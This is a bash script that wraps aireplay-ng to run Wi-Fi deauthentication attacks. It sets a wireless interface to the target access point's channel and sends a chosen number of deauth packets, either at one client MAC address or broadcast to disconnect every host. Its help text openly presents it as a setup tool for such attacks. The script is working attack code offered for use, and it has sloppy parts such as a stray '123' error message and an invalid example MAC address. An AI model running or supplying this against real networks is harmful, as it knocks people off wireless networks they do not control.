#!/bin/bash

red=`tput setaf 1`
purple=`tput setaf 125`
yellow=`tput setaf 3`
reset=`tput sgr0`

ERR="
     #-------------------------------------------------------------------------#
     |	${red}ERROR:${reset}                                                                 |
     |-------------------------------------------------------------------------|
     |	Wrong usage of command, use -h or --help option for more information.  |
     #-------------------------------------------------------------------------#
"

HELP="
    #-------------------------------------------------------------------------------------------------------------------------------------------------------------#
    |                                                                                                                                                             |
    |	${yellow}DESCRIPTION:${reset} 	deauth - Provides a quick and simple way to setup the enviroment for people intending to do deauthentication attacks ( naughty boys !).	  |	
    |																				  |
    |	${yellow}ARGUMENTS:${reset}	-i, 	interface that will be used for the attacks (use iwconfig to display the wireless interfaces available in you system).		  |
    |			-c,	channel in which the target Access Point operates.										  |
    |			-n,	number of deauthentication packets that will be sent.										  |
    |			-a,	MAC address of the Access Point.												  |
    |			-t,	MAC address of the target. 													  |
    |					${red}OBS:${reset} if this value is not given by the user the script will deactivate all hosts.					  |
    |																				  |
    |	${yellow}USAGE:${reset}		deauth -i WIRELESS_INTERFACE_NAME -c AP_CHANNEL -n NUMBER_OF_PACKETS -a AP_MAC -t TARGET_ADDR					   	  |
    |																				  |
    |	${yellow}EXAMPLES:${reset}	deauth -i wlan0 -c 1 -n 100 -a 4B:5T:99:7U:12:AA -t A8:D4:DD:12:43:F4 , in thisexample host A8:D4:DD:12:43:F4 will be deactivated.	  |
    |			deauth -i wlan0 -c 1 -n 100 -a 4B:5T:99:7U:12:AA -t, in this example all host will be deactivated. 					  |
    |																				  |
    #-------------------------------------------------------------------------------------------------------------------------------------------------------------#
"

#echo "$HELP"
#echo $#
#echo $1 $3 $5 $7 $9
#echo ${10}

if [ $1 == "-h" ] || [ $1 == "--help" ] ; then
	echo "$HELP"

elif [ $# -lt 9 ] ; then

	echo "$ERR"

elif [ $1 != "-i" ] || [ $3 != "-c" ] || [ $5 != "-n" ] || [ $7 != "-a" ] || [ $9 != "-t" ] ; then

	echo "123"

elif [ $1 == "-i" ] && [ $3 == "-c" ] && [ $5 == "-n" ] && [ $7 == "-a" ] && [ $9 == "-t" ] ; then

	ifconfig $2 down ; iwconfig $2 channel $4 ; ifconfig $2 up 
	sleep 1

	if [ -z ${10} ] ; then
		#echo "ataque broadcast"
		
		if [ $6 -eq $6 ] ; then
			aireplay-ng --deauth $6 -a $8 $2	

		else
			echo "$ERR"
			echo "		HINT: the value you specified for the -n option is not a number.
			"
		fi

	elif [ -n ${10} ] ; then
		#echo "ataque unicast"

		if [ $6 -eq $6 ] ; then
			aireplay-ng --deauth $6 -a $8 -d ${10} $2

		else
			echo "$ERR"
			echo "		HINT: the value you specified for the -n option is not a number 
			"

		fi
	fi	
	
fi
